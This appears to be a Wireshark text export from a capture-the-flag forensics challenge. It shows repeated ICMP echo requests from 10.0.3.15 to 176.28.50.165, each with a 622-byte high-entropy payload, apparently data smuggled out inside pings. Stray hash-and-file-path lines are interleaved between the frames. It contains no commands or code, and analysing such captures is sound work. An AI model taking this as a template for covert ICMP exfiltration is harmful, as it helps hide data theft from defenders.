	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 323]
	    Data (622 bytes)
	
d9a7b1273bea674d6e9f7df3faa2887e|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: c807a1f01c174fb8b852e04917376392ea2a8b8c1d29f11c‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    324 42.305231677   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 325)
	
	Frame 324: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x44ce [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 325]
	    Data (622 bytes)
	
aeada88b2b3d4ae799a37f30f1759bbd|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: f6f5d588c077d480c68d8d416a91e16b1b11024d85ef89e4‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    326 42.830600458   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 327)
	
	Frame 326: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xeb0d [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 327]
	    Data (622 bytes)
	
580987283ea4fd36f4fb0efef6b2471e|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 7c80ad7ddbaa4f0849b952e1f9e7d7a65eac5d0b55b22136‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    328 43.361429586   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 329)
	
	Frame 328: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x33b4 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 329]
	    Data (622 bytes)
	
335196ae3f1bdd929b0fe01c01cde121|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: cf9e6d38ea26cd7aeb5bdfca91471ec1473f7a1a5bb76e35‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    330 43.888967283   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 331)
	
	Frame 330: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x7d7e [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 331]
	    Data (622 bytes)
	
ca5f7adf4d7ddba5c8229cd75be1107f|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 6198ff820d688470906e06650f769dfca93ab926e3201a6a‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    332 44.425747503   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 333)
	
	Frame 332: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x8071 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 333]
	    Data (622 bytes)
	
e724ce3e4425aaa65714a4f9d22a413e|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: a909ad9d8c96101299126b60290badad0c9b38f55195be12‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    334 44.964022030   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 335)
	
	Frame 334: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xfd5c [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 335]
	    Data (622 bytes)
	
53b2ff40ca7b35d82b0628414fa80ca2|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: e620ee8981b1b131ce3deff37cecf4d3b8e2ca2b59b7761d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    336 45.501566884   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 337)
	
	Frame 336: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc1ac [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 337]
	    Data (622 bytes)
	
f05ab81d66efbf45c0e239da1a9fb3fb|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: bc7d2458377ef6f19ffef45abe7ec937cc1329a6223e901f‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    338 46.036758836   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 339)
	
	Frame 338: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xaa10 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 339]
	    Data (622 bytes)
	
76c17c25957d09457478fc0878d8c163|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 77cd7ddde45ba3dead59b3866f7ffbfff1d5affe332b57ae‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    340 46.577508457   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 341)
	
	Frame 340: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xe3c0 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 341]
	    Data (622 bytes)
	
c58bc5f14480ab215ac18c0c46f76fdb|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: efe7c20bbf406b6bd1ae8ded11063b0b929a31d95e150222‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    342 47.109580945   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 343)
	
	Frame 342: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x15d0 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 343]
	    Data (622 bytes)
	
6f49aae7a71b8ca86f505c600f86fae0|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 95b84fa43ff515c692daed5148af058823772224d2cb2458‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    344 47.641676760   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 345)
	
	Frame 344: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x09a3 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 345]
	    Data (622 bytes)
	
733f350fd14a2a114b8cdcc56e7ddcf5|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 962fe7cc4f7dca1a53e9091c619ae0db1124d49c90b2edaf‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    346 48.169588009   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 347)
	
	Frame 346: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x90e2 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 347]
	    Data (622 bytes)
	
de3b8b37feb7df50e84b4ad0c97d6eca|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 1004b4b7b7b368d1a2c68d1631119afaade324e03a367ba8‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    348 48.697152698   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 349)
	
	Frame 348: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x8fe9 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 349]
	    Data (622 bytes)
	
5ee3b6204dd9536583f2169ed5bb01e5|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 303e5ea6bbbb1b15355f5b0303038c978cc5ab528a9e9e1e‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    350 49.228989485   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 351)
	
	Frame 350: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x7834 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 351]
	    Data (622 bytes)
	
b19895520d3442421a6deb38764091c0|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 4ac95e7bed95a497faf3934f502a9512822f97cbf18637bc‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    352 49.761896257   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 353)
	
	Frame 352: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x844f [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 353]
	    Data (622 bytes)
	
0c6fde8da4f72088ff5f82f05c2961e0|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 38cafafec7cf352380277bb739a8d4a04c14714e06a60e99‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    354 50.288850591   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 355)
	
	Frame 354: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc06a [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 355]
	    Data (622 bytes)
	
c96bad227f95d63f854a5d18f974fe03|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: f67bf27d9870be0d1e6bf8a6d8cefdedbcd3ac1de9c774c2‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    356 50.821310311   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 357)
	
	Frame 356: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x6421 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 357]
	    Data (622 bytes)
	
db48fa83508faaa6f32c8531f93c6954|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: b40772d570212d2f57b1f639752f91ad632d4877b1bcdc1c‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    358 51.362054201   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 359)
	
	Frame 358: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xa871 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 359]
	    Data (622 bytes)
	
86ec2f5251082bb5ea62c7cd1ad5d227|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: ade1893021984a950ae3a3e3542abe0d921d251698669c94‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    360 51.890176897   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 361)
	
	Frame 360: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x8263 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 361]
	    Data (622 bytes)
	
dd58a0a65c50646c2500d4d890cd5064|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 9b62fa93f23c11537cbe2631311a95e013155484582f0414‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    362 52.425051617   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 363)
	
	Frame 362: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2f35 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 363]
	    Data (622 bytes)
	
f789e133ccf9c8345e7c91fdce66f312|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: aea34f9f3ec1216fa0a6a6860f3ef880056fbd45535313c6‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    366 53.509431007   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 367)
	
	Frame 366: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x43d7 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 367]
	    Data (622 bytes)
	
74a367716f7578453258052bb1e6fadf|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 9d3bd9bc752b262bc69e42ae6ca060999cb55a68031ac240‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    364 52.965501439   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 365)
	
	Frame 364: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2ce8 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 365]
	    Data (622 bytes)
	
f81ecd5a189fc1e291a22fe4b4faa96d|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 61e6cc99fce4273fa1b149659b183470203ffbd9cfc27145‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    368 54.041416618   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 369)
	
	Frame 368: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xa680 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 369]
	    Data (622 bytes)
	
d2c5b84d5565de6e2aa5fec3526c8e00|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: d98d88b842831c65edead3d4dac28ebababd8583ef210000‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    370 54.574097420   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 371)
	
	Frame 370: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xda4a [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 371]
	    Data (622 bytes)
	
be98c0017bd81afdb64f9da87d47cfb5|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 6f81982c7a2045c697b013eaa3a3df249345142553416cd3‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    372 55.106588288   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 373)
	
	Frame 372: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc8e8 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 373]
	    Data (622 bytes)
	
b5ace0fe02231a90dfca49adbf5386c2|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 55c67eed1e2c5ebc98743a0dc049279da4a6cf8211234650‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    374 55.641241975   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 375)
	
	Frame 374: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4979 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 375]
	    Data (622 bytes)
	
b5bc46fb3b15d39746a6176463617293|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 5b6f5151511170880d0d0d3cf3cc339120ec61ff5e7ae925‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    376 56.173178669   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 377)
	
	Frame 376: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x3245 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 377]
	    Data (622 bytes)
	
ccbce7309883972e43e38a14ed24ac4c|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: e7f3fbdfdfc7cd37dfcc430f3ec8a7cf3e939e1a91a9270a‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    378 56.704952992   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 379)
	
	Frame 378: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x6d3c [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 379]
	    Data (622 bytes)
	
3caa0627729861ca52112f61e037807a|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: c8e32784c90da8b83fa3e58bb61552775640251979378448‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    382 57.777836442   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 383)
	
	Frame 382: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2b52 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 383]
	    Data (622 bytes)
	
461534f6d19384f9036100771b5ff056|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 8baaaa2a6a6a6ab8fd8e3b78efbd2574efde0dcb126c28e0‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    380 57.246292712   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 381)
	
	Frame 380: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xcfeb [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 381]
	    Data (622 bytes)
	
193503b9744010432b107ea00994b0db|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 2b7d894c48e57260491ccf464a1bc7b103a31f2144e0ee08‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    384 58.309735074   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 385)
	
	Frame 384: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xcfe6 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 385]
	    Data (622 bytes)
	
b76507f82f59063f1361e6ab568c0051|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
